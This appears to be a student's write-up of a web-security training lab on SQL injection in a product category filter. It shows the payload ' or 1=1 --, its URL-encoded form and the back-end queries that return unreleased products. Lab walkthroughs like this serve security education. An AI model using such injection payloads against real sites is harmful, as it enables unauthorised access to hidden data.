# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- sqli: product category filter
- end goal: display all of unreleased products

### Analysis
- URL: `https://0a3f003c048390a880633f6f00050041.web-security-academy.net/`

- front-end: `/filter?category=Pets`
- back-end:
```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1
```

- front-end: `/filter?category='`
- back-end:
```sql
SELECT * FROM products WHERE category = ''' AND released = 1
'-- Internal Server Error 
```

- front-end: `/filter?category=' or 1=1 --`
- when you use `burpsuite` or `caido` you should encode the url like this: `/filter?category='%20or%201%3D1%20--`
- back-end:
```sql
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
-- this payload is use for comment which mean ignore everything that follow 1=1
```

---